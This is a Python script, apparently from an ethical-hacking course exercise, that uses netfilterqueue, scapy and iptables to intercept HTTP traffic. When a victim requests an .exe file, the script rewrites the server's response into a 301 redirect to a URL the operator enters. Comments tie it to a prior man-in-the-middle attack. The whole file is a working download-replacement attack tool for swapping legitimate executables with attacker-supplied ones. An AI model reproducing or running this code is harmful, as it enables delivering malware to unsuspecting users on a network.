# Created by FoxSinOfGreed1729
# many thanks to Zaid Sabih and udemy.com

import os
import netfilterqueue
import scapy.all as scapy

target = "test.com"
ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # converting the packet into a scapy packet because its more versatile and more useful

    if scapy_packet.haslayer(scapy.Raw):
        # We're checking for RAW layer, as all data sent over HTTP is placed in the RAW layer
        # if Dport is http it is a HTTP request
        # if Sport is http it is a HTTP response
        if scapy_packet[scapy.TCP].dport == 80:
            # we're checking if it's a request
            if ".exe" in str(scapy_packet[scapy.Raw].load) and target not in str(scapy_packet[scapy.Raw].load):
                print("[+] .exe request detected")
                # now we know that a .exe file is being downloaded on the host.
                # we could just put in out server into load field, but then, we'd have to dot he TCP handshake again
                # so instead of that we'll do
                # once we see the packet.show() output, we see that there is a request and response
                # we'll be changing the response
                # we need the correct seq number in the TCP protocol
                # so we need to put the RESPONSE SEQ to the REQUEST ACK
                ack_list.append(scapy_packet[scapy.TCP].ack)
                
        elif scapy_packet[scapy.TCP].sport == 80:
            # we're checking if it's a request
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[+] This is a response for downloading exe file")
                # we wont be needing the ack that we just used any more so we'll remove it
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                # this is the response
                # this is where we modify the file

                load = "HTTP/1.1 301 Moved Permanently\nLocation: "
                load = load + target + "\n\n\n"

                mod_pack = set_load(scapy_packet, load)
                packet.set_payload(bytes(mod_pack))
                print("[***] Successful file spoofing completed")

    packet.accept()


def set_load(packet, load):
    # https://en.wikipedia.org/wiki/List_of_HTTP_status_codes this is the list of HTTP status codes
    # what we wanna do, is redirect the user from the target site to our own site.
    # HTTP/1.1 301 Moved P
    # Permanently Location: target website
    # this is what we want, the new line is important

    packet[scapy.Raw].load = load
    # the extra \n characters are so that nothing clutters the location field
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def main():
    global target

    # packets go into the FORWARD chain only if they're coming from another computer.
    # so the line below is for when you've successfully completed an MITM attack
    # os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    # here we're taking all packets in the FORWARD and putting them into a queue with index no 0

    # packets go into the OUTPUT chain when they're coming from your own computer.
    # so the line below is for when you wanna modify packets you're sending to some place
    os.system("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0")
    os.system("sudo iptables -I INPUT -j NFQUEUE --queue-num 0")
    # the first statement queues up the requests from machine to server
    # the second statement queues up the requests from server to machine

    queue = netfilterqueue.NetfilterQueue()
    # queuing up the packets together so that we can modify them
    queue.bind(0, process_packet)
    # This allows us to connect/bind to the queue created in the command
    # queue.bind(0, process_packet)
    # The process packet will be called  and the 0 is the id of queue in the command

    target = input("[+] Enter The website you want the target to redirect to\n>>>")

    print("[+] Current target is\n>>>")
    print(target)
    print("[+] Script Running\n")
    try:
        queue.run()
    except KeyboardInterrupt:
        print("[-] Keyboard Interrupt detected, quitting...")
    except:
        print("[-] Some Error has occurred, quitting")

    # we even have to restore our IPtables rules back to normal
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush")
    print("[+] IPtables restored to normal")


main()
